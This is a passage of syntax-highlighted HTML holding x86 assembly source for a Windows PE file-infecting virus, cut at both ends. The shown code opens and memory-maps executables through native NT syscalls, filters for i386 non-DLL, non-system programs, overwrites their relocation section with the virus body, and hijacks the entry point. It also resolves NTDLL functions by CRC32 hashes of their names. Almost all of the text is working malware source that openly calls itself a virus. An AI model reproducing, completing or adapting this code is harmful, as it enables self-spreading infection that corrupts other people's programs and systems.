    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5Eh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy the string</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;size of path+filename</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;initialize the structure...</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">object_attr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_length</span><span class="sc4">],</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_rootdir</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_objectname</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_attribz</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_secdesc</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_secqos</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4060h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">io_status</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100007h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NtOpenFile</span><span class="sc0">          </span><span class="sc1">;open the file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0F0007h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">sHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtCS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;NtCreateSection</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">;correct stack</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">bytez</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;initialize some variablez</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sOffset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sOffset2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sOffset2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">sOffset2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">sOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtMVOS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;NtMapViewOfSection</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;EBX = start of memory-mapped file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">             </span><span class="sc1">;must be PE file</span><span class="sc0">

    </span><span class="sc1">;discard not_executable and system filez</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">esi.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.OH_Subsystem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_SUBSYSTEM_NATIVE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">if_end4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">if_end4</span><span class="sc0">             </span><span class="sc1">;is it large enough?</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;erase relocs record</span><span class="sc0">

    </span><span class="sc1">;align the section size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">o_vs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">o_al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">o_al</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">o_vs</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;save EBP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">idelta</span><span class="sc0">              </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">idelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">original_ep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">idelta</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">original_ep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">idelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">original_ep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">idelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;set saved_entrypoint variable</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">idelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">_Start</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">               </span><span class="sc1">;overwrite relocs by virus body</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">original_ep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">idelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;restore used variablez</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;restore EBP</span><span class="sc0">

</span><span class="sc5">if_end4</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtUVOS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;NtUnmapViewOfSection</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">if_end3</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NtClose</span><span class="sc0">             </span><span class="sc1">;close the section</span><span class="sc0">
</span><span class="sc5">if_end2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NtClose</span><span class="sc0">             </span><span class="sc1">;close the file</span><span class="sc0">
</span><span class="sc5">if_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">get_syscalls</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">77F80000h</span><span class="sc0">           </span><span class="sc1">;base of NTDLL.dll</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">c_find</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc1">;calculate CRC32 of the API</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;number of syscallz</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@callz</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">09ECA4E0Fh</span><span class="sc0">      </span><span class="sc1">;NtOpenFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0D5494178h</span><span class="sc0">      </span><span class="sc1">;NtQueryDirectoryFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0B964B7BEh</span><span class="sc0">      </span><span class="sc1">;NtClose</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03F2482E6h</span><span class="sc0">      </span><span class="sc1">;NtCreateSection</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">010710614h</span><span class="sc0">      </span><span class="sc1">;NtMapViewOfSection</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0864CF09Bh</span><span class="sc0">      </span><span class="sc1">;NtUnmapViewOfSection</span><span class="sc0">
</span><span class="sc5">@callz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

